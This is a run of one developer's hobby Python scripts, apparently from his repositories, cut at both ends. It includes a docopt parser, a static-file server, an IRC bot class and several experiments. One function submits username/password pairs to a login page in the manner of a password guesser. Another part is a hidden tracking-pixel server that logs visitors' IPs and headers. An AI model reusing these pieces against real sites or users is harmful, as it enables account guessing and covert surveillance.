        options = [Option.parse(s) for s in split if s.startswith('-')]
        defaults += options
    return defaults


def parse_section(name, source):
    pattern = re.compile('^([^\n]*' + name + '[^\n]*\n?(?:[ \t].*?(?:\n|$))*)',
                         re.IGNORECASE | re.MULTILINE)
    return [s.strip() for s in pattern.findall(source)]


def formal_usage(section):
    _, _, section = section.partition(':')  # drop "usage:"
    pu = section.split()
    return '( ' + ' '.join(') | (' if s == pu[0] else s for s in pu[1:]) + ' )'


def extras(help, version, options, doc):
    if help and any((o.name in ('-h', '--help')) and o.value for o in options):
        print(doc.strip("\n"))
        sys.exit()
    if version and any(o.name == '--version' and o.value for o in options):
        print(version)
        sys.exit()


class Dict(dict):
    def __repr__(self):
        return '{%s}' % ',\n '.join('%r: %r' % i for i in sorted(self.items()))


def docopt(doc, argv=None, help=True, version=None, options_first=False):
    """Parse `argv` based on command-line interface described in `doc`.

    `docopt` creates your command-line interface based on its
    description that you pass as `doc`. Such description can contain
    --options, <positional-argument>, commands, which could be
    [optional], (required), (mutually | exclusive) or repeated...

    Parameters
    ----------
    doc : str
        Description of your command-line interface.
    argv : list of str, optional
        Argument vector to be parsed. sys.argv[1:] is used if not
        provided.
    help : bool (default: True)
        Set to False to disable automatic help on -h or --help
        options.
    version : any object
        If passed, the object will be printed if --version is in
        `argv`.
    options_first : bool (default: False)
        Set to True to require options precede positional arguments,
        i.e. to forbid options and positional arguments intermix.

    Returns
    -------
    args : dict
        A dictionary, where keys are names of command-line elements
        such as e.g. "--verbose" and "<path>", and values are the
        parsed values of those elements.

    Example
    -------
    >>> from docopt import docopt
    >>> doc = '''
    ... Usage:
    ...     my_program tcp <host> <port> [--timeout=<seconds>]
    ...     my_program serial <port> [--baud=<n>] [--timeout=<seconds>]
    ...     my_program (-h | --help | --version)
    ...
    ... Options:
    ...     -h, --help  Show this screen and exit.
    ...     --baud=<n>  Baudrate [default: 9600]
    ... '''
    >>> argv = ['tcp', '127.0.0.1', '80', '--timeout', '30']
    >>> docopt(doc, argv)
    {'--baud': '9600',
     '--help': False,
     '--timeout': '30',
     '--version': False,
     '<host>': '127.0.0.1',
     '<port>': '80',
     'serial': False,
     'tcp': True}

    See also
    --------
    * For video introduction see http://docopt.org
    * Full documentation is available in README.rst as well as online
      at https://github.com/docopt/docopt#readme

    """
    argv = sys.argv[1:] if argv is None else argv

    usage_sections = parse_section('usage:', doc)
    if len(usage_sections) == 0:
        raise DocoptLanguageError('"usage:" (case-insensitive) not found.')
    if len(usage_sections) > 1:
        raise DocoptLanguageError('More than one "usage:" (case-insensitive).')
    DocoptExit.usage = usage_sections[0]

    options = parse_defaults(doc)
    pattern = parse_pattern(formal_usage(DocoptExit.usage), options)
    # [default] syntax for argument is disabled
    #for a in pattern.flat(Argument):
    #    same_name = [d for d in arguments if d.name == a.name]
    #    if same_name:
    #        a.value = same_name[0].value
    argv = parse_argv(Tokens(argv), list(options), options_first)
    pattern_options = set(pattern.flat(Option))
    for options_shortcut in pattern.flat(OptionsShortcut):
        doc_options = parse_defaults(doc)
        options_shortcut.children = list(set(doc_options) - pattern_options)
        #if any_options:
        #    options_shortcut.children += [Option(o.short, o.long, o.argcount)
        #                    for o in argv if type(o) is Option]
    extras(help, version, argv, doc)
    matched, left, collected = pattern.fix().match(argv)
    if matched and left == []:  # better error message if left?
        return Dict((a.name, a.value) for a in (pattern.flat() + collected))
    raise DocoptExit()
import proxy.httpproxy.httpkie as httpkie


def login(username, password, d = None):
	print "trying", username, password

	if d is None:
		d = httpkie.Downloader()

	login = {
		"username": username,
		"password": password
	}

	data = d.download("http://kitakitsune.org/login.php", get=login)

	return "True" in data
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# NONAME v0.0.0 (dd.mm.yy) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
# Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
#
# Notes:
    # 
import commands
import os



OLD = "/home/bystrousak/data/last.old"
WHITE_LIST = [
	"e268.kolej.tul.cz",
	"wifi-00-166.tul.cz", 
	"105.175.broadband2.iol.cz",
	"Thu May  5 14:03 - 14:09  (00:05)     93.99.138.40",
	"generic-pae",
]



# read data
last = commands.getoutput("last -a").splitlines()
commands.getoutput("touch " + OLD)


file = open(OLD)
last_old = file.read().splitlines()
file.close()

# filter old lines
data = filter(lambda x: x not in last_old, last)

wdata = []
for rule in WHITE_LIST:
    for line in data:
        if rule in line:
            wdata.append(line)

data = filter(lambda x: x not in wdata, data)

if len(data) > 0:
    os.system("mail bystrousak -s \"Podivny login\" <<EOF\n" + "\n".join(data) + "EOF")
    print "\n".join(data)

# save data
file = open(OLD, "w")
file.write("\n".join(last))
file.close()







#! /usr/bin/env python
# -*- coding: utf-8 -*-
# Imports =====================================================================
import os.path
from os.path import join

import sh
import magic

import bottle
from bottle import run
from bottle import hook
from bottle import abort
from bottle import error
from bottle import route
from bottle import request
from bottle import redirect
from bottle import response

# from abclinuxu_korelace.tracker_logger import serve_png


# Variables ===================================================================
STATIC_DIR = 'public_html'


# Functions ===================================================================
def get_filename(fn):
    return os.path.splitext(fn)[0]


def get_suffix(fn):
    suffix = os.path.splitext(fn)[-1]

    if suffix.startswith(".") and len(suffix) > 1:
        return suffix[1:]

    return suffix


def localized_fn(fn):
    return fn.replace(STATIC_DIR, "", 1)


def get_index(files):
    indexes = filter(lambda x: get_filename(x) == "index", files)

    priorities = [
        "html",
        "htm",
        "txt",
    ]
    priority_dict = {val: cnt for cnt, val in enumerate(priorities)}
    indexes.sort(key=lambda x: priority_dict.get(get_suffix(x), 100))

    if not indexes:
        return None

    return indexes[0]


def list_files(dir_name):
    # this is necessary, or BAD things happen
    local_dir_url = localized_fn(os.path.dirname(dir_name))

    out = sh.tree(
        dir_name,
        du=True,
        F=True,
        h=True,
        H=local_dir_url,
        dirsfirst=True,
        T=local_dir_url
    )

    # create link to upper directory
    return out.replace(
        'href="%s">%s</a>' % (local_dir_url, local_dir_url),
        'href="..">..</a>'
    )


# Plugins =====================================================================
def set_xclacks(response):
    response.set_header("X-Clacks-Overhead", "GNU Terry Pratchett")


def static_file(*args, **kwargs):
    response = bottle.static_file(*args, **kwargs)
    set_xclacks(response)

    return response


@hook('before_request')
def x_clacks_overhead_header():
    """
    See http://www.gnuterrypratchett.com for details.
    """
    set_xclacks(response)


# Routes ======================================================================
@error(404)
def error404(error):
    return '%s not found!' % localized_fn(error.body)


@route("/")
@route("/<fn:path>")
def static(fn="/"):
    fn = fn.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    real_fn = os.path.normpath(STATIC_DIR + "/" + fn)

    if not real_fn.startswith(STATIC_DIR) or not os.path.exists(real_fn):
        abort(404, real_fn)

    if os.path.isdir(real_fn):
        # handle linking to dir without / at the end - this breaks relative
        # HTML links
        if not fn.endswith("/"):
            redirect("/" + fn + "/")

        dirname = real_fn + "/"  # this is really important
        index = get_index(
            x for x in os.listdir(dirname)
            if not os.path.isdir(join(dirname, x))
        )

        if index:
            return static_file(
                join(localized_fn(dirname), index),
                root=STATIC_DIR
            )

        return list_files(dirname)

    # handle downloads
    viewable_files = [
        "txt",
        "htm",
        "html",
        "xml",
        "jpg",
        "jpeg",
        "png",
        "gif",
        "bmp",
        "pdf",
        "css",
        "js",
        "epub",
        "webm",
        "gifv",
        "py",
    ]

    should_download = get_suffix(real_fn).lower() not in viewable_files

    mime = magic.Magic(mime=True).from_file(real_fn)
    if mime == "inode/symlink":
        mime = "auto"

    # magic have problems with CSS mime setting it to text/plain, which results
    # in rejection of such CSS in firefox
    if real_fn.endswith(".css"):
        mime = "text/css"

    return static_file(
        localized_fn(real_fn),
        root=STATIC_DIR,
        download=should_download,
        mimetype=mime,
    )


# Main program ================================================================
if __name__ == '__main__':
    run(server="paste", host="0.0.0.0", port=80)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import tracker_logger
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import time
import base64
from Queue import Queue
from threading import Thread

from bottle import get
from bottle import run
from bottle import request
from bottle import HTTPResponse

from sqlitedict import SqliteDict


# Variables ===================================================================
QUEUE = Queue()
# 1x1 pix transparent png
TRACKER_PNG = base64.b64decode("""
    iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABmJLR0QA/wD/AP+gvaeTAAAACXB
    IWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4AkJCwQSMQjHdAAAABl0RVh0Q29tbWVudABDcmVhdG
    VkIHdpdGggR0lNUFeBDhcAAAANSURBVAjXY/j//z8DAAj8Av5cn8/aAAAAAElFTkSuQmCC
""")


# Functions & classes =========================================================
def log_connection(fn, queue):
    def get_unique_key(data):
        ip = data["ip"]
        local_time = data["local_time"]

        return "%s|%s" % (ip, str(local_time))

    with SqliteDict(fn) as tracker_log:
        while True:
            data = queue.get()
            key = get_unique_key(data)

            tracker_log[key] = data
            tracker_log.commit()


def start_logger(fn):
    thread = Thread(
        target=log_connection,
        kwargs={
            "fn": fn,
            "queue": QUEUE,
        },
    )
    thread.daemon = True
    thread.start()


start_logger("tracker_logs.sqlite")


@get("/t")
@get("/tracker.png")
def serve_png():
    details = {
        "forwarded_for": request.environ.get('HTTP_X_FORWARDED_FOR'),
        "ip": request.environ.get('REMOTE_ADDR'),
        "local_time": time.time(),
    }
    details.update(dict(request.headers))

    QUEUE.put(details)

    headers = {
        "Content-Type": "image/png",
        "Content-Length": len(TRACKER_PNG),
        "Accept-Ranges": "bytes",

        "Pragma-directive": "no-cache",
        "Cache-directive": "no-cache",
        "Cache-control": "no-cache",
        "Pragma": "no-cache",
        "Expires": "1",
    }

    return HTTPResponse(
        body=TRACKER_PNG,
        status=200,
        **headers
    )


# Main program ================================================================
if __name__ == '__main__':
    run(
        host='localhost',
        port=8080,
        debug=True,
        reloader=True,
    )
#! /usr/bin/env python2
# -*- coding: utf-8 -*-
import sys
import json
import os.path
import sqlite3

from sqlitedict import SqliteDict


def create_table(cursor):
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS `logs` (
            `local_time` REAL,
            `ip` Varchar(30),
            `referer` TEXT,
            `user_agent` TEXT,
            `headers_as_json` TEXT
        );
    """)


def convert_to_insert(item):
    local_time = item["local_time"]
    del item["local_time"]

    ip = item["ip"]
    del item["ip"]

    referer = item.get("Referer", "")
    if referer:
        del item["Referer"]

    user_agent = item.get("User-Agent", "")
    if user_agent:
        del item["User-Agent"]

    headers = json.dumps(item)

    return (
        "INSERT INTO logs VALUES (?, ?, ?, ?, ?)",
        (
            local_time,
            ip,
            referer,
            user_agent,
            headers
        )
    )


def write_to_sqlite(cursor, insert):
    cursor.execute(*insert)


def convert_to_sqlite(fn):
    conn = sqlite3.connect('tracker_logs_clean.sqlite')
    conn.text_factory = str
    cursor = conn.cursor()

    create_table(cursor)
    conn.commit()

    with SqliteDict(fn) as serialized:
        for cnt, item in enumerate(serialized.itervalues()):
            write_to_sqlite(cursor, convert_to_insert(item))
        
        if cnt % 100 == 0:
            conn.commit()

    conn.commit()
    conn.close()


if __name__ == '__main__':
    if len(sys.argv) == 1:
        sys.stderr.write("Usage:\n")
        sys.stderr.write("\t%s tracker_logs.sqlite\n\n" % sys.argv[0])
        sys.exit(1)

    fn = sys.argv[1]
    if not os.path.exists(fn):
        sys.stderr.write("%s doesn't exists!\n" % fn)
        sys.exit(1)

    convert_to_sqlite(fn)
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# NONAME v0.0.0 (dd.mm.yy) by Bystroushaak (bystrousak@kitakitsune.org)

import time

def xe():
	t = time.time()
	a = {}
	for i in xrange(0, 500000):
		if i in a:
			a[i] += 1
		else:
			a[i] = 1
	t2 = time.time()
	return t2 - t

def xe2():
	t = time.time()
	a = {}
	for i in xrange(0, 500000):
		try:
			a[i] += 1
		except KeyError:
			a[i] = 1
	t2 = time.time()
	return t2 - t

print xe()
print xe2()




#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import sys

from PyQt4 import uic
from PyQt4 import QtGui
from PyQt4 import QtCore

import github


# Variables ===================================================================
form_class = uic.loadUiType("ui_resources/main_window.ui")[0]


# Class definition ============================================================
class IssueTrackerMainWindow(QtGui.QMainWindow, form_class):
    def __init__(self, parent=None):
        QtGui.QMainWindow.__init__(self, parent)
        self.setupUi(self)
        self.refresh_btn.clicked.connect(self.refresh_btn_clicked)

        item = QtGui.QTreeWidgetItem([QtCore.QString("hello")])
        self.issue_tree.addTopLevelItem(item)

        item.addChild(QtGui.QTreeWidgetItem([QtCore.QString("hi")]))

    def refresh_btn_clicked(self):
        username = self.username_box.text()


# Main code ===================================================================
if __name__ == '__main__':
    # app = QtGui.QApplication(sys.argv)
    # main_window = IssueTrackerMainWindow()
    # main_window.show()
    # app.exec_()

    print github.list_all_repositories("Bystroushaak")#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import json
import base64

import httpkie


# Variables ===================================================================
PERSONAL_TOKEN = open("personal_token.txt").read().strip()
DOWNER = httpkie.Downloader()
DOWNER.headers = {
    "User-Agent": "Bystroushaak",
    "Accept-Charset": "utf-8",
    "Authorization": "Basic " + base64.b64encode(
        PERSONAL_TOKEN + ":x-oauth-basic"
    )
}


# Functions & classes =========================================================
class Project(object):
    def __init__(self, json_data):
        self.url = json_data[u"url"]
        self.project_name = json_data["name"]

        self.open_issue_count = json_data["open_issues_count"]
        self.issue_url = json_data["issues_url"].split("{")[0]

        self.json_data = json_data

    def __str__(self):
        return "%s:%d" % (self.project_name, self.open_issue_count)

    def __repr__(self):
        return self.__str__()


def json_loads(fn):
    """
    Decorator for conversion of JSON strings to python data.
    """
    def json_loads_decorator(*args, **kwargs):
        data = fn(*args, **kwargs)
        return json.loads(data)
    return json_loads_decorator


@json_loads
def _get_issue_data():
    return DOWNER.download("https://api.github.com/user/issues")


def list_all_repositories(username):
    issue_data = _get_issue_data()

    print len(issue_data)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================



# Variables ===================================================================
# Functions & classes =========================================================
def get_vect_hash(vect):
    vect_hash = vect[0] * (256*256*256)
    vect_hash += vect[1] * (256*256)
    vect_hash += vect[2] * 256
    vect_hash += vect[3]

    return vect_hash % 255


def compress(inp):
    out = []

    # padding of the input
    if len(inp) % 2 != 0:
        inp += " "

    inp = map(lambda x: ord(x), inp)
    pairs = zip(inp[0::2], inp[1::2])

    hash_cache = []
    mega_hash_cache = []
    for first, second in pairs:
        word = first * 256 + second
        hash_cache.append(word % 255)

        mega_hash_cache.append(first)
        mega_hash_cache.append(second)

        # compute "hash" for four last characters
        if len(mega_hash_cache) == 4:
            out.append(
                [hash_cache[0], hash_cache[1], get_vect_hash(mega_hash_cache)]
            )
            hash_cache = []
            mega_hash_cache = []

    return out

inp = "Hello joe, how are you?."
out = compress(inp)

print inp
print out
print "uncompressed len:", len(inp)
print "compressed len:", len(sum(out, []))#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import sys


# Variables ===================================================================



# Functions & classes =========================================================
def find_hash(first_vect, second_vect, vect_hash):
    solutions = []

    for first in first_vect:
        for second in second_vect:
            tmp_vect = (first << 16) + second
            if tmp_vect % 255 == vect_hash:
                solutions.append(tmp_vect)

    print len(solutions)

    return solutions


def decompress(inp):
    # create cache
    cache = {}
    for i in range(65536):
        l = cache.get(i % 255, [])
        l.append(i)
        cache[i % 255] = l

    dec_tree = []
    possibilities = []
    for first, second, vect_hash in inp:
        find_hash(
            cache[first],
            cache[second],
            vect_hash
        )
        # break

    return dec_tree


decompress([[173, 216, 134], [143, 217, 105], [145, 136, 26], [230, 129, 104], [215, 153, 113], [228, 109, 82]])
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from functools import wraps

# just typical python decorator
def decorator(fn):
    def hello(something, something_else):
        pass

    @wraps(fn)
    def wrapper(*args, **kwargs):
        print "calling", fn.__name__
        hello("something", "something_else")

        return fn(*args, **kwargs)

    return wrapper


def another_decorator(fn=None, someparam=True):
    def another_decorator_wrapper(fn):
        @decorator
        @wraps(fn)
        def another_wrapper(*args, **kwargs):
            print "calling_another", fn.__name__

            return fn(*args, **kwargs)

        return another_wrapper

    if fn:
        return another_decorator_wrapper(fn)

    return another_decorator_wrapper


@another_decorator()
def some_function():
    "Here is docstring!"
    print "some_function() was executed!"


some_function()
print
print "Name", some_function.__name__
print "Docstring", some_function.__doc__#! /usr/bin/env python3
# coding: utf-8

def split_array(array, size):
    if len(array) == 1:
        return [[array[0]]]
    if len(array) < size:
        return [array]
    else:
        return [array[0:size]] + split_array(array[size:], size)

print split_array([1, 2, 3], 2)#! /usr/bin/env python
# -*- coding: utf-8 -*-
"""

by Bystroushaak bystrousak@kitakitsune.org
"""
#
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 Unported License
# (http://creativecommons.org/licenses/by/3.0/).
#
#= Imports ====================================================================
import json

from bottle import get, put, run



#= Variables ==================================================================



#= Functions & objects ========================================================
@get("/")
@put('/hello')
def hello():
    return json.dumps({"message": "Hello World"})




#= Main program ===============================================================
if __name__ == '__main__':
	run(host='localhost', port=8080, debug=True)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from bottle import Bottle, run


def d2(fn=None, path="default.sqlite", table="default"):
    def d(fn):
        def w(*args, **kwargs):
            return fn(*args, **kwargs)
        return w

    # support for calling this decorator without arguments
    if fn:
        return d(fn)

    return d


def d(fn):
    def w(*args, **kwargs):
        kwargs["something"] = "xex"
        return fn(*args, **kwargs)
    return w


app = Bottle()

@app.get('/hello')
@d2(path="foo", table="bar")
@d
def hello(something):
    return "Hello World!"


print app.routes[0].get_undecorated_callback()

import code
code.interact(None, None, locals())
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================



# Variables ===================================================================



# Functions & objects =========================================================
class Xex(object):
    def __init__(self, ):
        self.xex = {"xax": None}

    @property
    def xax(self):
        return self.xex["xax"]

    @xax.setter
    def xax(self, val):
        self.xex["xax"] = val


# Main program ================================================================
x = Xex()

x.xax = 1
print x.xax
print x.xex#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
#= Imports ====================================================================



#= Variables ==================================================================



#= Functions & objects ========================================================
class FirstCommand:
    def react(self, obj, obj_locals):
        locals().update(obj_locals)

        self.two()

    def two(self):
        print "First command", "1"


class SecondCommand:
    def react(self, obj, obj_locals):
        locals().update(obj_locals)

        print "Second command", b


class Main:
    def xex(self):
        print "xex"
    def f(self):
        a = 1
        b = 2

        commands = [FirstCommand(), SecondCommand()]

        for c in commands:
            c.react(self, locals())



#= Main program ===============================================================
if __name__ == '__main__':
    m = Main()
    m.f()
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================


# Functions & classes =========================================================
class SD(object):
    def __init__(self, el="xe"):
        self.el = el

    def __get__(self, obj, objtype):
        print("getting")
        return self.el

    def __set__(self, obj, value):
        print("setting")
        self.el = value


class Holder(object):
    x = SD()

h = Holder()

# h.x = 6
print(h.x)


# class Celsius(object):
#     def __init__(self, value=0.0):
#         self.value = float(value)
#     def __get__(self, instance, owner):
#         return self.value
#     def __set__(self, instance, value):
#         self.value = float(value)


# class Temperature(object):
#     celsius = Celsius()

# temp=Temperature()
# print(temp.celsius) #calls Celsius.__get__#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import zmq
from multiprocessing import Process


# Variables ===================================================================



# Functions & objects =========================================================
def end_point():
    context = zmq.Context()

    fin_work_rec = context.socket(zmq.PULL)
    fin_work_rec.bind("tcp://127.0.0.1:%d" % DB_PORT)



# Main program ================================================================
if __name__ == '__main__':
    pass
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from setuptools import setup


# Variables ===================================================================
changelog = open('CHANGELOG.rst').read()
long_description = "\n\n".join([
    open('README.rst').read(),
    changelog
])


# Functions ===================================================================
def getVersion(data):
    """
    Parse version from changelog written in RST format.
    """
    def allSame(s):
        return not any(filter(lambda x: x != s[0], s))

    def hasDigit(s):
        return any(char.isdigit() for char in s)

    data = data.splitlines()
    return next((
        v
        for v, u in zip(data, data[1:])  # v = version, u = underline
        if len(v) == len(u) and allSame(u) and hasDigit(v) and "." in v
    ))


# Actual setup definition =====================================================
setup(
    name='FrozenIdea',
    version=getVersion(changelog),
    description="Simple IRC class skelet for quick bot creation.",
    long_description=long_description,
    url='https://github.com/Bystroushaak/FrozenIdea',

    author='Bystroushaak',
    author_email='bystrousak@kitakitsune.org',

    classifiers=[
        "Development Status :: 4 - Beta",
        'Intended Audience :: Developers',

        "Programming Language :: Python",
        "Programming Language :: Python :: 2",
        "Programming Language :: Python :: 2.7",

        "License :: OSI Approved :: MIT License",

        "Topic :: Communications",
    ],
    license='MIT',

    py_modules=['frozenidea'],

    zip_safe=False,
    include_package_data=True,
)
#! /usr/bin/env python2
# -*- coding: utf-8 -*-
"""
FrozenIdea event driven IRC bot class
by  Bystroushaak (bystrousak@kitakitsune.org)
and Thyrst (https://github.com/Thyrst)
"""
# Interpreter version: python 2.7
#
# TODO
#   :irc.cyberyard.net 401 TODObot � :No such nick/channel
#   ERROR :Closing Link: TODObot[31.31.73.113] (Excess Flood)
#
# Imports =====================================================================
import time
import socket
import select
import ssl
from collections import namedtuple


# Exceptions ==================================================================
class QuitException(Exception):
    pass


# Datastructures ==============================================================
class ParsedMsg(namedtuple("ParsedMsg", "nick type text")):
    pass


# Class definition ============================================================
class FrozenIdea(object):
    """
    FrozenIdea IRC bot template class.

    This class allows you to write easily event driven IRC bots.

    Attributes:
        nickname (str): Nickname used by the bot
        password (str): Password for irc server (not channel).
        real_name (str): Real name irc property - shown in whois.
        part_msg (str): Message shown when IRC bot is leaving the channel.
        quit_msg (str): Same as `part_msg`, but when quitting.
        chans (str): Dict {"chan_name": [users,]}.
        join_list (list): List of the channel names to which the bot should
            join.
        socket_timeout (int): Timeout for the socket in seconds. Default 60.
        last_ping (float): Timestamp of the last PING message.
        default_ping_diff (int): Time delta between pings. Used for reconnects.
            Default 300s.
        verbose (str): Should the bot print all incomming messages to stdout?
                      default False
        port (int): Port of the server the bot is connected to.
        server (str): Hostname of the server the bot is connected to.
        _socket (obj): Socket object. Don't mess with this.
        ENDL (str): Definition of end of the line sequence.

    Raise :class:`QuitException` if you wish to quit.
    """
    def __init__(
        self, nickname, server, port, join_list=None, lazy=False, _ssl=False):
        """
        Constructor.

        Args:
            nickname (str): Name the bot should use.
            server (str): Address of the server.
            port (int): Port the server uses for IRC.
            join_list (list, default None): List of the channels to which the
                bot should join after connection is established.
            lazy (bool, default False): Should the bot be lazy and not connect
                when the constructor is called?
        """
        self.nickname = nickname
        self.real_name = "FrozenIdea IRC bot"

        self.part_msg = "Fuck it, I quit."
        self.quit_msg = self.part_msg
        self.password = ""
        self.verbose = False

        self.socket_timeout = 60
        self.last_ping = time.time()
        self.default_ping_diff = 60 * 5  # 20m

        self.chans = {}
        self.join_list = join_list or []

        self.server = server
        self.port = port
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._endl = "\r\n"
        self._ssl = _ssl

        if self._ssl:
            self._socket = ssl.wrap_socket(self._socket)

        if not lazy:
            self.connect()

    def connect(self):
        """
        Connect socket to server.
        """
        self._socket.connect((self.server, int(self.port)))
        self._socket.setblocking(0)

    def _socket_send_line(self, line):
        """
        Send line thru socket. Adds self._endl if there is not already one.

        Args:
            line (str): Line which will be sent to socket.
        """
        if not line.endswith(self._endl):
            line += self._endl

        # lot of fun with this shit -- if you wan't to enjoy some unicode
        # errors, try sending "��"
        try:
            line = bytes(line)
        except UnicodeEncodeError:
            try:
                line = bytes(line.decode("utf-8"))
            except UnicodeEncodeError:
                line = bytearray(line, "ascii", "ignore")

        self._socket.send(line)

    def join(self, chan):
        """
        Join channel. Adds # before `chan`, if there is not already one.

        Args:
            chan (str): Name of the channel.
        """
        if not chan.startswith("#"):
            chan = "#" + chan

        self._socket_send_line("JOIN " + chan)

    def join_all(self, chans=None):
        """
        Join all `chans`. If the `chans` is ``None``, use
        :attr:`self.join_all`.

        Args:
            chans (list, default None): List of the channels to join.
        """
        if chans is None:
            chans = self.join_list

        for chan in chans:
            if isinstance(chan, basestring):
                self.join(chan)
            elif type(chan) in [tuple, list]:
                for c in chan:
                    self.join(c)

    def rename(self, new_name):
        """
        Change :attr:`self.nickname` to `new_name`.

        Args:
            new_name (str): New nickname.
        """
        if self.nickname != new_name:
            self.nickname = new_name
            self._socket_send_line("NICK " + new_name)

    def send_msg(self, to, msg, msg_type=0):
        """
        Send message to given user or channel.

        Args:
            to (str): User or channel.
            msg (str): Message.
            msg_type (int, default 0): Type of the message. `0` for normal
                     message, `1` for action message or `2` for notice.
        """
        line = [
            "PRIVMSG %s :%s" % (to, msg),
            "PRIVMSG %s :\x01ACTION %s\x01" % (to, msg),
            "NOTICE %s :%s" % (to, msg),
        ]

        try:
            line = line[int(msg_type)]
        except IndexError:
            line = "PRIVMSG " + to + " :" + msg

        self._socket_send_line(line)

    def send_array(self, to, array):
        """
        Send list of messages from `array` to `to`.

        Args:
            to (str): User or channel.
            array (list): List of the messages.
        """
        for line in array:
            self.send_msg(to, line)

    def part(self, chan, msg=None):
        """
        Leave channel `chan`. Show .part_msg if set.

        Args:
            chan (str): Name of the channel.
            msg (str, default None): Optional part message.
        """
        if msg is None:
            msg = self.part_msg

        if self.verbose:
            print "---", chan

        self._socket_send_line("PART " + chan + " :" + str(msg))

    def quit(self):
        """
        Leave all channels and close connection. Show :attr:`self.quit_msg`
        if set.
        """
        self._socket_send_line("QUIT :" + self.quit_msg)
        self._socket.close()

    def run(self):
        """
        Run the ._really_run() method and check it for errors to ensure clean
        quit.
        """
        try:
            self._really_run()

        except KeyboardInterrupt:
            self.on_quit()
            self.quit()
            return

        finally:
            self.on_quit()
            self.quit()
            raise

    def _really_run(self):
        """
        Lowlevel socekt operations.

        Read data from socket, join them into messages, react to pings and so
        on.
        """
        # check server password
        if self.password != "":
            self._socket_send_line("PASS " + self.password)

        # identify to server
        self._socket_send_line(
            "USER " + self.nickname + " 0 0 :" + self.real_name
        )
        self._socket_send_line("NICK " + self.nickname)

        msg_queue = ""
        while True:
            # select read doesn't consume that much resources from server
            ready_to_read, ready_to_write, in_error = select.select(
                [self._socket],
                [],
                [],
                self.socket_timeout
            )

            # timeouted, call .on_select_timeout()
            if not ready_to_read:
                self.on_select_timeout()
                continue

            try:
                # read 4096B from the server
                msg_queue += self._socket.recv(4096)
            except ssl.SSLWantReadError:
                select.select([self._socket], [], [], self.socket_timeout)
                continue

            # whole message doesn't arrived yet
            if self._endl not in msg_queue:
                continue

            # get arrived messages
            splitted = msg_queue.split(self._endl)
            msgs = splitted[:-1]  # all fully parsed messages
            msg_queue = splitted[-1]  # last one may not be whole

            for msg in msgs:
                msg = bytes(msg)
                if self.verbose:
                    print msg.strip()

                if msg.startswith("PING"):  # react o ping
                    ping_val = msg.split()[1].strip()
                    self._socket_send_line("PONG " + ping_val)
                    self.on_ping(ping_val)
                    self.last_ping = time.time()
                    continue

                try:
                    self._logic(msg)
                except QuitException:
                    self.on_quit()
                    self.quit()
                    return

    def _parse_msg(self, msg):
        """
        Get from who is the `msg`, which type it is and it's body.

        Args:
            msg (str): Message obtained from the server.

        Returns:
            obj: :class:`ParsedMsg` instance.
        """
        msg = msg[1:]  # remove : from the beggining

        nickname, msg = msg.split(" ", 1)
        if ":" in msg:
            msg_type, msg = msg.split(":", 1)
        else:
            msg_type = msg.strip()
            msg = ""

        return ParsedMsg(
            nick=nickname.strip(),
            type=msg_type.strip(),
            text=msg.strip(),
        )

    def _logic(self, msg):
        """
        React to `msg`. This is what calls event callbacks.

        Args:
            msg (str): Message from the server.
        """
        parsed = self._parse_msg(msg)

        # end of motd
        if parsed.type.startswith("376"):
            self.on_server_connected()

        # end of motd
        elif parsed.type.startswith("422"):
            self.on_server_connected()

        # nickname already in use
        elif parsed.type.startswith("433"):
            nickname = parsed.type.split(" ", 2)[1]
            self.on_nickname_used(nickname)

        # nick list
        elif parsed.type.startswith("353"):
            chan_name = "#" + parsed.type.split("#")[-1].strip()

            new_chan = True
            if chan_name in self.chans:
                del self.chans[chan_name]
                new_chan = False

            # get list of nicks, remove chan statuses (op/halfop/..)
            msg = map(
                lambda nick: nick if nick[0] not in "&@%+" else nick[1:],
                parsed.text.split()
            )

            self.chans[chan_name] = msg

            if new_chan:
                self.on_joined_to_chan(chan_name)

        # PM or chan message
        elif parsed.type.startswith("PRIVMSG"):
            nick, hostname = parsed.nick.split("!", 1)

            if nick == self.nickname:
                return

            # channel message
            if "#" in parsed.type:
                msg_type = parsed.type.split()[-1]

                if parsed.text.startswith("\x01ACTION"):
                    msg = parsed.text.split("\x01ACTION", 1)[1]
                    msg = msg.strip().strip("\x01")
                    self.on_channel_action_message(
                        msg_type,
                        nick,
                        hostname,
                        msg
                    )
                    return

                self.on_channel_message(
                    msg_type,
                    nick,
                    hostname,
                    parsed.text
                )
                return

            # pm msg
            if not parsed.text.startswith("\x01ACTION"):
                self.on_private_message(nick, hostname, parsed.text)
                return

            # pm action message
